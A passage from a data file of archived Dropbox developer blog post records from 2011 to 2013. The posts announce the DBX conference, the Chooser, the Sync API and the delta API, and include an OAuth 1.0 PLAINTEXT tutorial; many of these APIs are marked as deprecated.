Python Bee Finals on the big stage. Sound exciting? Here's what Dropbox's Guido van Rossum has to say: \"A Python bee! What a wonderful idea to test your wizard-level knowledge of programming in Python. I'm looking forward to watching the champions battle -- though I don't think I'm crazy enough to compete myself. :-)\" Whether you want to battle it out or just sit back and watch, the Python Bee is sure to be a blast! Are you up for the challenge? // Tags Developers Developer Community Python // Copy link Link copied Link copied", "date": "2013-07-02"},
{"website": "Dropbox", "title": "DBX Conference Agenda", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/dbx-conference-agenda", "abstract": "DBX, Dropbox's first developer conference, is coming up on July 9th at Fort Mason. Registration is closing soon, so if you have an invitation and haven't responded yet, now's the time to claim your ticket! We have a great agenda for the day, with lots of deep technical sessions and a couple of surprises. Take a look at the agenda below, and we hope to see you at Fort Mason! // Tags Developers // Copy link Link copied Link copied", "date": "2013-06-28"},
{"website": "Dropbox", "title": "8 days to DBX!", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/8-days-to-dbx", "abstract": "We're so excited to see you next week at DBX ! We want to say thank you to everyone who requested an invitation. The conference is now sold out, and registration is closed. If you can't make it to the event, don't worry! We'll be posting videos of the sessions afterwards, and you can follow @DBX2013 for live updates on Twitter. // Tags Developers Archive // Copy link Link copied Link copied", "date": "2013-07-01"},
{"website": "Dropbox", "title": "Now in beta: OAuth 2.0, File type permissions, and Sync API 1.1", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/now-in-beta-oauth-2-0-file-type-permissions-and-sync-api-1-1", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. If you’re not a regular visitor of our developer forum , you may have missed three new API features we released in beta: OAuth 2 – The Core API now includes beta support for OAuth 2. OAuth 2 brings better support for client-side JavaScript and other client apps, and all apps benefit from registering redirect URIs and simplified authorization. Visit the docs to read about the new endpoints, or use the beta builds of the PHP, Python, Java, Ruby, and JavaScript Core API SDKs available on the forum . File type permissions – There are lots of times where you want to access files outside of an App folder, but your app doesn’t need access to everything, just the right things. File type permissions let your app access just the class of files it needs. You can use it now with the existing Core API SDKs and the beta Sync API SDKs. For instructions on how to set up a new File type permission app, visit the forum . Sync API 1.1 SDKs – New versions of the Sync API SDKs add support for the new File type permission, thumbnails, shareable links, and faster performance with better battery life. You can download the beta of Sync API 1.1 on the forum . We hope you enjoy these new beta features. As always, please share your feedback on the forums! // Tags Developers Announcements Api V1 Deprecated // Copy link Link copied Link copied", "date": "2013-06-24"},
{"website": "Dropbox", "title": "New developer guide and branding guidelines published", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/new-developer-guide-and-branding-guidelines-published", "abstract": "Every month, hundreds of developers submit their app for production status on the Dropbox Platform. We learn a lot from developers through this process, and that experience helps us to clarify and simplify our documentation. To that end, we just published a new developer guide and updated branding guidelines . These are living documents, and we want to work on them collaboratively with the Dropbox developer community. To contribute, please join us in discussing these documents on the forum . // Tags Developers Guide Announcements // Copy link Link copied Link copied", "date": "2013-06-11"},
{"website": "Dropbox", "title": "Registration is open for DBX!", "author": ["Dropboxblogs"], "link": "https://dropbox.tech/developers/registration-is-open-for-dbx", "abstract": "We've started to send out the first set of invitations to DBX, our first developer conference on July 9th in San Francisco. The morning will kick-off with a keynote, followed by in-depth tech sessions to learn more about some existing and new Dropbox platform features. Throughout the day, you'll get chances to meet the Dropbox team and connect with partners to see how they're building with the Dropbox APIs. And we’re preparing delicious treats to keep you going through the afterparty! Request an invitation here and follow @dbx2013 for news. Get psyched and we'll see you at Fort Mason! // Tags Developers Archive // Copy link Link copied Link copied", "date": "2013-06-11"},
{"website": "Dropbox", "title": "Chooser hits the mobile web", "author": ["Chris Varenhorst"], "link": "https://dropbox.tech/developers/chooser-hits-the-mobile-web", "abstract": "Today we’re releasing a rewrite of the Chooser to better support mobile websites. The Chooser currently works for the mobile web, but with this release we made it even better for a wider range of devices, regular web sites, mobile-optimized webapps, and reactive designs, too! The new Chooser includes: Mobile-friendly sign in Touch event handling High resolution UI assets (i.e. awesome new buttons) Wide device support (works on iOS 5+ and Android 2.3+) You can already check out the mobile web optimized version in the wild on Careerbuilder's mobile web site or our mobile web Chooser demo page . So get choosy today, take a look at our developer docs , and post any of your feedback on the forums . // Tags Developers Drop-Ins Announcements Mobile // Copy link Link copied Link copied", "date": "2013-05-21"},
{"website": "Dropbox", "title": "New Core API SDK for PHP 5.3+", "author": ["Tom Kleinpeter"], "link": "https://dropbox.tech/developers/new-core-api-sdk-for-php-5-3", "abstract": "Every new member of the Dropbox engineering team does something we call residency projects. They're 2–4 day tasks that help new engineers get familiar with the Dropbox code base and process, and also meet new people on other teams during the first few weeks at the company. For my residency project, I worked with the Platform team to tackle one of their long standing requests: a PHP SDK for the Core API. With a little help from the team, that SDK is now at version 1.0. We’ve put together a getting started guide to help you use the SDK, as well as a full API reference . If something doesn't work as expected, let us know on the API forums . // Tags Developers Announcements Api V1 Deprecated // Copy link Link copied Link copied", "date": "2013-05-03"},
{"website": "Dropbox", "title": "Introducing DBX - Dropbox’s first developer conference", "author": ["Dropboxblogs"], "link": "https://dropbox.tech/developers/introducing-dbx-dropboxs-first-developer-conference", "abstract": "Mark your calendars! This summer, the Dropbox community will come together on July 9 for a day of creativity and exploration at San Francisco’s Fort Mason. At DBX, you’ll meet fellow developers, see the great things they’re building, and share ideas with the engineers and designers working on Dropbox’s API. But most importantly, you’ll be the first to learn about new products that will make developing on Dropbox even easier. We’ve got a lot of exciting news to share, so follow @dbx2013 for the latest. See you at Fort Mason! Request an invitation // Tags Developers Archive // Copy link Link copied Link copied", "date": "2013-05-06"},
{"website": "Dropbox", "title": "Easily add multi-select and drag-n-drop uploads with the Dropbox Chooser", "author": ["Dima Ryazanov"], "link": "https://dropbox.tech/developers/easily-add-multi-select-and-drag-n-drop-uploads-with-the-dropbox-chooser", "abstract": "Heads up choosy developers, we've just finished the final touches on a couple new features for the Dropbox Chooser : multi-select and built-in uploads! Multi-select Now, your app can accept multiple files from Dropbox at once. Just set multiselect: true in your options and you'll get piles of files in no time. Built-in uploads If their files aren't already in Dropbox, users can now upload files from their computer, directly via the Chooser. These uploaded files are saved in their Dropbox, and immediately available to your web app. The Chooser even lets users drag-n-drop files. Stylish new threads You may have noticed the Chooser's new style. We regularly improve the design so it always works and looks great, and you'll get the latest design updates automatically — no need to update your code! These were some of the most popular feature requests from our developers, and we're excited to see how you use them in your web app. Check out the new Dropbox Chooser , let us know if you have any feedback , and stay tuned for a lot more coming soon! // Tags Developers Tips Tricks Drop-Ins Deprecated // Copy link Link copied Link copied", "date": "2013-04-15"},
{"website": "Dropbox", "title": "Reminder: Turning off Core API version 0 on Wednesday, May 1st, 2013", "author": ["Sean Lynch"], "link": "https://dropbox.tech/developers/reminder-turning-off-core-api-version-0-on-wednesday-may-1st-2013", "abstract": "We first announced our plans to turn off version 0 of the Dropbox API back in August of 2012 . As a reminder, here was our version 0 timeline: October 11, 2011 - Announced version 1 of the Core API , deprecating version 0. August 17, 2012 - Announced version 0 turn off date of December 1, 2012 . December 1, 2012 - Extended to March 4, 2013 to give developers more time to migrate and users time to upgrade their apps if necessary. March 4, 2013 - Restricted access to version 0 to existing users. No new users will be able to link to apps using version 0 of the API. May 1, 2013 - Turn off Core API version 0. On Wednesday this week, we’ll finally complete the deprecation process and turn off version 0 for all users. If you’re a developer that still hasn’t moved to version 1 of the Core API, see our migration guide . For any other questions, visit the developer forum . // Tags Developers Announcements Api V1 Deprecated // Copy link Link copied Link copied", "date": "2013-04-29"},
{"website": "Dropbox", "title": "Build great web apps, directly in Dropbox", "author": ["Greg Kurtz"], "link": "https://dropbox.tech/developers/build-great-web-apps-directly-in-dropbox", "abstract": "Thousands of apps integrate with Dropbox to make it easier to manage your projects. With services like Paperplane , Scriptogram , and Site44 , you can create simple websites and blogs that publish directly from Dropbox. You can even manage more complex Javascript apps in Dropbox with services like Backlift and Harp . Now, our friends at Windows Azure are using the Dropbox Core API to let you manage full web apps directly from your Dropbox account. Just put your app's code in Dropbox and push it live with a click from the Windows Azure dashboard. You can make changes directly in Dropbox, and just deploy again so that your users have the latest and greatest version of your app! The Windows Azure integration makes managing projects much easier: as a developer, you can collaborate with your whole team in Dropbox from any device, see older versions of your files, and even restore previous deployments. Head over to Windows Azure to start building sites (and make sure you add some Dropbox magic to your app). And for more details on the new Dropbox deployment features, see their announcement blog post . // Tags Developers Deprecated Developer Spotlight // Copy link Link copied Link copied", "date": "2013-03-18"},
{"website": "Dropbox", "title": "Customer support and invoicing get better with the Dropbox Chooser", "author": ["Dan Levine"], "link": "https://dropbox.tech/developers/customer-support-and-invoicing-get-better-with-the-dropbox-chooser", "abstract": "We launched the Chooser a few months ago and have been blown away by the uptake. Developers are using Chooser for everything including Customer Support, Invoicing and CRM. We want to make a habit of highlighting the best applications that integrate Dropbox. In that vein, below are some of the folks using Chooser. Let us know if you have a great Dropbox integration worth sharing. It always helps customer support people when a user submits an image of the issue in question. Tons of people store their screenshots from mobile and desktop in Dropbox and Freshdesk has made it easy for users to add files from Dropbox to their tickets. Head over to Freshdesk to learn more. Abishek Sridharan, a Product Manager at Freshdesk on being able to integrate Dropbox so quickly: “We’ve been intending to integrate with Dropbox for a while now. We always knew that the integration would be really useful for our customers in the world of support. When we heard about the Chooser and the reduced development time it afforded us, we could not ignore the opportunity.” Thousands of successful freelancers and companies use Ballpark from the folks at Metalab to track employee time, create invoices, and get paid online. Ballpark users can use Dropbox to attach files to their invoices, estimates and discussions. Learn more on the Ballpark blog .Metalab also make the popular Flow application that helps teams work better together. Flow is a beautiful way for teams to work together on web or mobile and complete tasks. The Flow guys blogged about the benefits of Chooser awhile back. Jake Paul, Lead Developer on Ballpark and Flow had this to say: “Adding the Dropbox Chooser to Flow and Ballpark was quick and bug-free. Our customers love having the option to share their Dropbox files, especially because it saves them from having to wait for a large file to upload if it’s already in Dropbox.” Blimp is a simple project management tool for teams of designers, developers and other creatives. Now you can easily bring files from Dropbox into Blimp. Check out the Blimp blog for more info. Founder of Blimp, Giovanni Collazo had this to say about Chooser: “The Dropbox integration was ridiculously easy to complete, in a matter of minutes we were up and running. The simplicity of the chooser allowed us to deliver a highly requested feature in no time.” // Tags Developers Developer Spotlight Partners // Copy link Link copied Link copied", "date": "2013-02-12"},
{"website": "Dropbox", "title": "Introducing the Dropbox Sync API for mobile developers", "author": ["Brian Smith"], "link": "https://dropbox.tech/developers/introducing-the-dropbox-sync-api-for-mobile-developers", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. Hey Developers! Get ready to add some Dropbox magic to your apps with the Sync API for iOS and Android , a powerful new library that makes it easier than ever to sync with Dropbox. The API takes care of all the complexity around caching, syncing, and working offline so that you can focus on creating the best mobile apps – it's like having your own private Dropbox client built right into your app! Dropbox, built in The Sync API lets your app work with Dropbox as if it were a local filesystem on the device. We take care of syncing and caching for you so you can work on delivering the best apps and a seamless experience to your users across different devices and platforms. Write locally, sync globally You can quickly list the contents of a folder, or move, delete, and create files and folders locally and see the results immediately. The Sync API handles caching for you, retrying uploads and downloads, and quickly discovering changes, leaving you with a simple view of files and folders. Work offline too! Because the Sync API caches locally, your app works great even without an Internet connection. We'll sync things up when your app comes online. Ready to start building? There's a few ways to start working with the Sync API: Example apps Both the Android SDK and iOS SDK include a simple note-taking app that syncs with Dropbox. You'll discover how easy it is to create new files as well as read files using the Sync API. Sync API tutorial Create a new project and step through how to get started with the Sync API by reading our tutorials for Android and iOS . API docs If you're ready to add sync to your app, dive straight into the iOS or Android documentation to see everything you can do with the Sync API. A few developers have been building with the Sync API already, and we’d like to thank them for the valuable feedback. Chris Cox, the developer of Squarespace Note , told us that it cut his Dropbox code in half! We’d also like to give a shout out to the Dropbox developer community for the requests that helped guide the development of the Sync API. The possibilities are endless – give it a go, and give us your feedback . We can't wait to see the apps you create with the Sync API! // Tags Developers Announcements Api V1 Mobile Deprecated // Copy link Link copied Link copied", "date": "2013-02-06"},
{"website": "Dropbox", "title": "Dropbox Chooser is already popping up in your favorite apps", "author": ["Sean Lynch"], "link": "https://dropbox.tech/developers/dropbox-chooser-is-already-popping-up-in-your-favorite-apps", "abstract": "Last Thursday, we publicly announced the Dropbox Chooser , the fastest way to integrate Dropbox into your web apps. In less than a week, we’ve seen a tremendous response from developers and a bunch of great integrations (if you’d like to get started, take a look at the Dropbox Chooser docs ). We're psyched and wanted to share some of favorite examples with you: Now, when you’re using Trello to collaborate with your team, you can add files and photos directly from your Dropbox. Check out the Trello blog to learn more about how Dropbox works with Trello. Daniel LeCheminant, Trello engineer, was excited about how quickly they could add Dropbox to their app: \"Adding Dropbox attachments to Trello was surprisingly easy. We had our integration ready within hours of first hearing about the Dropbox Chooser, and were able to release it to hundreds of thousands of users the next day.\" With the Dropbox Chooser in Mail Pilot , you can now attach any of your files from Dropbox to an email. Read more about the integration on their blog . Mail Pilot’s CEO Alex Obenauer had much to say about how easy the Dropbox Chooser was to implement: “We had always wanted to spend the time to support Dropbox in Mail Pilot; it was always one of those features on our \"dreams for the future\" list. But because of how much is already on our plate, we wouldn't have had the time for one or more of us to learn the API, develop with it, and build a feature around it. The Dropbox Chooser completely eliminated this first step; there is no need to learn the API to implement it; it was as simple as a button and a callback.” Wrike , another great project management tool, was also thrilled to integrate with the Dropbox Chooser. See their blog for more details on how they've integrated the chooser. Here is what Andrew Filev, Wrike’s CEO had to say about using the Chooser: “Many of our customers asked us to launch Dropbox integration. Thanks to the Chooser, launching that integration was a breeze. In fact, it’s probably the easiest integration we’ve ever built. Kudos to Dropbox team for making this so simple and fast!” And the last integration on our list, announced just yesterday, is Expensify , an app that takes the headaches out of expense reporting. You can read more on their blog . From Kevin Kuchta, Expensify engineer: “Integrating the chooser was easy- it dropped right in and worked well. The chooser dialog itself was working in about 5 minutes, and the only real work was shuffling around our backend to handle a URL, plus some miscellaneous refactoring as a result of some of these changes” Finally, we also want to thank Asana and HelloFax for integrating the Dropbox Chooser in preparation for our launch. Their feedback made it that much easier for the developers we’ve mentioned above (and many more) to get integrate the Chooser. Thanks again for your support and keep the Chooser integrations coming! // Tags Developers Drop-Ins Partners Deprecated Developer Spotlight // Copy link Link copied Link copied", "date": "2012-11-21"},
{"website": "Dropbox", "title": "Announcing the Dropbox Chooser", "author": ["Dima Ryazanov"], "link": "https://dropbox.tech/developers/announcing-the-dropbox-chooser", "abstract": "People rely on Dropbox to access their files from anywhere. On the platform team, it’s our goal to make this easy, either through the Dropbox app or through apps built on the Dropbox API. That’s why we’re making it even simpler for you to add Dropbox to your web apps with the new Dropbox Chooser — a quick way to integrate Dropbox into your web apps with just a few lines of HTML. We built the Dropbox Chooser after seeing many developers spend precious time creating file selectors of their own. Although it seems simple in functionality, building a great user experience for selecting files takes a lot of time. With the Dropbox Chooser we’re making Dropbox more accessible for our developers with a simple file browser that includes built-in search and photo gallery. The Dropbox Chooser can be used as a simple button or called from JavaScript, as we explain in our documentation . We’re excited to have our friends at Asana be among the first to integrate it into their application. Read all about it on the Dropbox blog . In fact, the Chooser is so easy to drop in to your site, the developers at Hellofax were able to integrate it in a day (we just gave them the code this week). So, we look forward to working with all of you to build amazing apps that work with Dropbox. If you have any feedback, let us know on the forums . // Tags Developers Drop-Ins Announcements // Copy link Link copied Link copied", "date": "2012-11-15"},
{"website": "Dropbox", "title": "Using Dropbox's Delta API: Lessons Learned From Site44", "author": ["Dropbox Team"], "link": "https://dropbox.tech/developers/using-dropboxs-delta-api-lessons-learned-from-site44", "abstract": "Where Site44 uses the delta API How to use the delta API Achieving low latency Simplifying the rest of your API use A unique benefit This guest post is written by Steve Marx , one of the founders of Site44 , a static web hosting service built on top of Dropbox. Dropbox has a rich API that allows developers to query and manipulate data in Dropbox. One of the newest additions to the API is /delta , an efficient way to keep track of changes to a user's Dropbox. This API has been available in production since March of this year, and we at Site44 have been developing with it since its beta in February. Along the way, we developed some best practices for making effective use of this valuable API. Where Site44 uses the delta API Site44 provides static website hosting to Dropbox users. We essentially act as a web server in front of Dropbox, taking incoming requests and determining which file from Dropbox should be sent as a response. To maximize website performance and to minimize the load on Dropbox's servers, we avoid fetching content from Dropbox except when absolutely necessary. Instead, we maintain our own copy of all our users' content. The delta API is what lets us keep that copy up-to-date even as users are making changes to their websites in Dropbox. How to use the delta API Each call you make to the delta API returns a list of \"delta entries.\" Each delta entry consists of a path and metadata. If the metadata is null, it means the path was deleted. If the metadata is present, it's the current metadata for that path. On your first call to the delta API, you'll receive delta entries that include every file in the user's Dropbox to which your app has access ( ideally just an app folder ). On subsequent calls, you'll only see delta entries for paths that have been created, modified, or deleted since the last call. I like to think of the delta entries as a set of instructions for how to update an app's local state to match Dropbox's state. They aren't necessarily the exact changes that a user made, so don't think of them as a log or an activity feed. The only guarantee the delta API makes is that if you process each of the delta entries, your state will match Dropbox's at the time of the call. For Dropbox to return to you the right set of changes, it has to know what changes you've already seen. To that end, every response from the delta API returns a \"cursor,\" which you then pass as a parameter on your next call. When the cursor is present in the call, it means you're asking Dropbox \"What's changed since you gave me this cursor?\" There's one last field returned by the delta API: \"reset.\" If this field is set to true, it means you should discard all your local state before processing the delta entries. This happens the first time you call the API (when you have no cursor). Otherwise it should be rare, but make sure your code handles it properly. Achieving low latency A big part of Site44's value is how quickly we can pick up changes that users make to files in their Dropbox. Because the delta API is based on polling, we see those changes only as quickly as we poll the API. We'd like to see changes within a second of when they're made, and there's no way we can poll at that rate. Even if we could, Dropbox might not be happy with the number of requests per second we were making to their API. To solve this problem, we use a hybrid approach. We poll as fast as we reasonably can, but we also poll on-demand when someone refreshes in the browser. This means that if a user makes a change to a file in Dropbox and then refreshes his website in the browser, he will see his changes immediately. This approach has worked very well for us, and we find that our users are impressed with how quickly we're able to pick up changes to their sites. Simplifying the rest of your API use The delta API, though slightly more complicated than the rest of Dropbox's API, lets you simplify the rest of your code. If we didn't have the delta API, we'd have to periodically walk the contents of a user's Dropbox, checking metadata to figure out what's changed. Because we do have the delta API, the rest of Site44's interaction with Dropbox is simple. When we need to retrieve a file that's changed, we just use the /files API to retrieve the new file. The delta API ensures that we can make a small number of calls to Dropbox and still maintain a perfect copy of our users' data. Thanks to our hybrid approach of timed and on-demand polling, we can do all of this with very low latency. A unique benefit Site44 leverages Dropbox's ease of use and its API to provide our customers with an absurdly simple web hosting experience. Without the delta API, it would have been a pain to keep customer content in sync; the delta API made it straightforward to provide this essential quality to our customers. As far as we know, Dropbox is the only cloud storage provider to offer first-class support for synchronization—give it a try! // Tags Developers Developer Spotlight // Copy link Link copied Link copied", "date": "2012-10-10"},
{"website": "Dropbox", "title": "Retiring the Deprecated Version 0 API", "author": ["The Dropbox Api Team"], "link": "https://dropbox.tech/developers/retiring-the-deprecated-version-0-api", "abstract": "Last year, we announced version 1 (\"V1\") of the Dropbox API . V1 introduced many new features including mandatory OAuth authentication which is more secure and gives users control over how applications access their data. We are excited that the majority of developers and apps have already moved to V1. As part of the V1 announcement, we also mentioned that we'd be phasing out version 0 (\"V0\") of the API. Today we want to let you know that we'll be retiring version 0 on December 1st, 2012 . After December 1st, the V0 API will be shut down and applications using it will no longer be able to make calls. Retiring V0 is an important step in improving security for Dropbox users as well as enabling new features in the API. If your application still uses V0 API or an older SDK, please plan to migrate before this date. You can also find a more detailed explanation of the changes in V1 in our migration guide . For special cases, we can provide an extension. Please contact api-migration@dropbox.com with any questions or to apply for an extension. // Tags Developers Announcements Deprecated // Copy link Link copied Link copied", "date": "2012-08-17"},
{"website": "Dropbox", "title": "Using OAuth 1.0 with the \"PLAINTEXT\" signature method", "author": ["Kannan Goundan"], "link": "https://dropbox.tech/developers/using-oauth-1-0-with-the-plaintext-signature-method", "abstract": "OAuth is the way every Dropbox API request is signed to verify the user and permission of the request. If you're using the API with one of our SDKs , then there's nothing for you to do; OAuth is already handled for you. However if that's not an option and you end up dealing with OAuth directly, here are some tips to make your life easier: Use the \"PLAINTEXT\" signature method of OAuth 1.0 (definitely) Don't use an OAuth library, just do it yourself (probably) Why? OAuth 1.0 (which is what the Dropbox API uses) was designed to work over unencrypted HTTP, so it does a bunch of crypto to try and make things secure. However it's error-prone, and if you're using SSL, unnecessary. Fortunately, OAuth 1.0 also has a \"PLAINTEXT\" signature method specifically for SSL that is way simpler. It's so simple that it's probably less work to implement it yourself than to try and use an existing OAuth library. (OAuth libraries tend to provide an API that is the lowest common denominator of the different methods, which makes them unnecessarily complicated if you only want PLAINTEXT.) Here's how to do it yourself (equivalent Python code here ): 0. Get a Dropbox API app key and secret from the My Apps page. 1. Make an API call for a request token : Copy POST https://api.dropbox.com/1/oauth/request_token Your HTTP request should have the following header: Copy Authorization: OAuth oauth_version=\"1.0\", oauth_signature_method=\"PLAINTEXT\",\r\noauth_consumer_key=\"<app-key>\", oauth_signature=\"<app-secret>&\" The response body will be a url-encoded string: Copy oauth_token=<request-token>&oauth_token_secret=<request-token-secret> Parse out the request token and secret and save them somewhere. 2. Have the user authorize your app. To do this, send the user's browser to: Copy https://www.dropbox.com/1/oauth/authorize?oauth_token=<request-token>&oauth_callback=<callback-url> The callback-url is where Dropbox will redirect the user’s browser when authorization is complete. Typically, this will be something like https://yoursite.com/auth_complete . It’s just a way for your app to know that the user has approved your app, so you can continue. Make a call to convert your request token into an access token : Copy POST https://api.dropbox.com/1/oauth/access_token This token is what lets you make calls to the Dropbox API. Your HTTP request should have the following header: Copy Authorization: OAuth oauth_version=\"1.0\", oauth_signature_method=\"PLAINTEXT\",\r\noauth_consumer_key=\"<app-key>\", oauth_token=\"<request-token>\",\r\noauth_signature=\"<app-secret>&<request-token-secret>\" The response body will be a url-encoded string: Copy oauth_token=<access-token>&oauth_token_secret=<access-token-secret>&uid=<user-id> Parse out the access token and secret and save them somewhere long-term. You no longer need the request token and secret. 4. You can now make normal API requests. For example, let’s get the user’s account info : Copy GET https://api.dropbox.com/1/account/info Your HTTP request should have the following header: Copy Authorization: OAuth oauth_version=\"1.0\", oauth_signature_method=\"PLAINTEXT\",\r\noauth_consumer_key=\"<app-key>\", oauth_token=\"<access-token>\",\r\noauth_signature=\"<app-secret>&<access-token-secret>\" That’s it. You can add the Authorization header in the same way to make any of the calls available in the API . // Tags Developers Tips Tricks Archive // Copy link Link copied Link copied", "date": "2012-07-13"},
{"website": "Dropbox", "title": "Chunked Uploads Beta", "author": ["Li Haoyi"], "link": "https://dropbox.tech/developers/chunked-uploads-beta", "abstract": "Dropbox API developers know that uploading large files can be a pain. Apart from the 150MB limit on /files_put , the file itself may not fit in memory or the HTTP connection may time out or disconnect. Furthermore, if something happens half way through uploading a big file, there's nothing to do but to start all over again. Last week, we released the beta of the /chunked_upload endpoint that solves these problems. This lets you upload a large file in multiple chunks spread over several requests, to be reconstituted on the server when everything has been sent. This neatly avoids the problems mentioned above, letting you easily upload a multi-gigabyte file over a spotty connection without worry. To go along with the API beta, we’ve released special beta builds of the SDKs to expose this feature. Here’s a link to download it for your favorite language: Python: SDK.zip , docs . Ruby: SDK.zip , docs . Java: SDK.zip , docs . Android: SDK.zip , docs . And browse the documentation to learn more. // Tags Developers Announcements Deprecated // Copy link Link copied Link copied", "date": "2012-08-09"},
{"website": "Dropbox", "title": "New sharing model will replace Public folder", "author": ["The Dropbox Api Team"], "link": "https://dropbox.tech/developers/new-sharing-model-will-replace-public-folder", "abstract": "We wanted to let our developers know about an upcoming change to the Public folder for new user accounts. In April, we launched the ability to share any file or folder in your Dropbox with a simple link. This new sharing mechanism is a more generalized, scalable way to support many of the same use cases as the Public folder. After July 31, 2012, we will no longer create Public folders in any new Dropbox accounts. If your app depends on Public folders, we recommend switching to the /shares API call. Public folders in existing accounts, however, will continue to function as before. Please email us at api-program@dropbox.com if you have any questions or concerns. // Tags Developers Announcements Deprecated // Copy link Link copied Link copied", "date": "2012-06-15"},
{"website": "Dropbox", "title": "Three's Company", "author": ["Kannan Goundan"], "link": "https://dropbox.tech/developers/threes-company", "abstract": "The single biggest feature request since we launched the API is the ability to keep up with changes to files in a user's Dropbox. So, we're happy to announce that the /delta call is out and ready to use in production! It returns a list of files and folders that have been added, deleted, or modified since the last time you called /delta , allowing you to update your local state incrementally to match. This is much more efficient than using /metadata to achieve the same thing. (You still have to poll periodically to see if /delta has any changes to report.) Thanks to everyone who gave us feedback during the beta period. Two other updates: /copy_ref is now also out of beta. You can use it in production to programatically copy files directly between two Dropbox accounts (with permission from both users). No need to download and re-upload files. Last, we've also added a new SDK for OS X developers (in addition to our existing iOS SDK). This will make distributing through the Mac App Store easier. If you've already used the iOS SDK, the OS X SDK will be a snap. The new OS X SDK and updated SDKs are available at the usual spot . If you have any feedback, let us know on the forums . // Tags Developers Announcements Api V1 Deprecated // Copy link Link copied Link copied", "date": "2012-03-28"},
{"website": "Dropbox", "title": "A fix to the /shares API call", "author": ["Ramesh Balakrishnan"], "link": "https://dropbox.tech/developers/a-fix-to-the-shares-api-call", "abstract": "We made a small change to the /shares API call earlier today that makes it consistent with the intended behavior (as documented). Previously, /shares usually returned a direct link to the contents of the file or folder itself. Now, it will always return a link to a preview page — an HTML page with a preview of the file with an option to download it. Files shared from the Public folder will also return a preview page rather than a direct link. This change affects all developers using the /shares call who rely on the returned link being a direct link to file contents. If you are generating the link to allow users to share it with others then you won't be affected. This change was first announced via email to all developers using /shares before Feb. 1. Since then, some more developers have begun using this call. To give these developers enough time to switch over, we’re grandfathering the old behavior for them until April 15. Everyone else has the ability to create the new preview links now. Please email us at api-program@dropbox.com if you have any questions or concerns. // Tags Developers Announcements Archive // Copy link Link copied Link copied", "date": "2012-03-21"},
{"website": "Dropbox", "title": "New \"copy ref\" feature and update to the /delta call", "author": ["Chris Varenhorst"], "link": "https://dropbox.tech/developers/new-copy-ref-feature-and-update-to-the-delta-call", "abstract": "We're releasing another set of beta SDKs with two updates: a new API feature called \"copy refs\" and a second beta of the /delta call. Copy refs (beta) The new /copy_ref call returns a unique reference to a file in a user's Dropbox that can be used to copy that file to any other user's Dropbox. Sharing files before /copy_ref meant that you had to download the files yourself and then upload them to your users. With /copy_ref you can quickly copy files between users without handling the file at all. Copying folders is not supported at this time. The /fileops/copy call has been extended to accept a \"from_copy_ref\" parameter that uses the copy_ref to copy the file to the path specified. We're releasing this in beta to get feedback. Apps with production status will not be able to use this call until it's out of beta. If you run into any issues, let us know on the forum thread . /delta (beta 2) There's a new HTTP endpoint for the call: /delta_beta2 . This second beta release works with apps that have full Dropbox access - no longer limited to apps with App Folder permission only. There have also been a few tweaks to the call's response format: The list of delta entries is now in a field named \"entries\", instead of \"delta\". Instead of a \"reset\" entry in the list, there's a top-level Boolean field named \"reset\". The format of \"add\" and \"delete\" entries have changed slightly. Each delta entry now includes a lower-cased version of the entry's path. This is to help apps treat file paths the same way Dropbox does — preserve case, but compare paths in a case insensitive way. The old HTTP endpoint is still up, but we'll be taking it down on March 1. If you run into any issues, let us know on the forum thread . SDKs Python: tar.gz , zip , docs . Ruby: tar.gz , zip , docs . Java: tar.gz , zip , docs . // Tags Developers Announcements Archive // Copy link Link copied Link copied", "date": "2012-02-23"},
{"website": "Dropbox", "title": "First ever Dropbox hack night", "author": ["Chris Varenhorst"], "link": "https://dropbox.tech/developers/first-ever-dropbox-hack-night", "abstract": "Last week we welcomed over 30 developers from the local community to the Dropbox offices for our first ever hack night! We kicked off the night with a quick intro of our latest APIs . The Dropbox API team was on hand answering questions while Red Bull and pizza-fueled developers hacked the night away. It was exciting to see several startups begin their Dropbox integration. We'd like to give a special shoutout to our winners Hackpad, Trove, and Spool for their awesome work! Hackpad is an easy-to-use directly edited wiki. Their hack night project lets you link to files from your Dropbox and reference them from within your hackpad pad. Trove lets you access all your digital content through one simple API. They added a feature to export pictures from various websites directly to your Dropbox. Spool lets you save ideas, articles, images, and PDFs for later access on your phone or tablet. During hack night, they made it easy to import any files from your Dropbox to your Spool queue. Overall, we heard lots of new ideas and received useful feedback to guide our API efforts. Stay tuned to our developers site or follow @dropboxapi on Twitter for future updates. Keep hacking, - The API Team // Tags Developers Developer Community Hackathon // Copy link Link copied Link copied", "date": "2011-12-07"},
{"website": "Dropbox", "title": "New API v1 - It's official!", "author": ["Dropbox Api Team"], "link": "https://dropbox.tech/developers/new-api-v1-its-official", "abstract": "We're happy to announce that version 1 of the API is now live. We've been beta testing this version over the last month, and it's a major improvement in terms of both functionality and developer experience. Here's a list of the most significant changes we've made in this release. Enhanced calls metadata - Allows you to optionally list deleted files. files (POST) - File uploads now accept an overwrite parameter to help prevent accidentally overwriting data. New rev parameter - All metadata objects include a rev parameter, which is intended to replace revision . It is an opaque string type and can be passed to various calls to indicate a particular version of a file. New calls files_put - Upload files to Dropbox with an easier interface. revisions - Access users' file revision history. restore - Restore a file to a previous revision. search - Search Dropbox for files. share - Create shareable links to files in Dropbox. media - Stream files directly from Dropbox. New SDKs We've updated all our SDKs. We now have Android and Objective-C mobile SDKs, and fully featured Python, Ruby, and Java packages for web developers. We've rebuilt them so they're easier to use, and they also include documentation and example apps to help get you up and running as quickly as possible. Better security API security has been enhanced: We've introduced App folders: app-specific folders that Dropbox will automatically create and keep track of, even when users move or rename them. Authentication is done exclusively with OAuth, meaning your app never needs to handle login information. With the iOS and Android SDKs, we've optimized the OAuth flow to use the official Dropbox app, making linking your app faster than before. All API calls are done over SSL. What about v0? Right now, version 0 of the API still works exactly as it did before. However, you should upgrade to v1 when you get a chance, not only because of all the new features but also because we'll be phasing out v0. Don't worry though, we'll give you plenty of time and notice before deprecating v0. - The API Team // Tags Developers Announcements Api V1 Deprecated // Copy link Link copied Link copied", "date": "2011-10-22"},
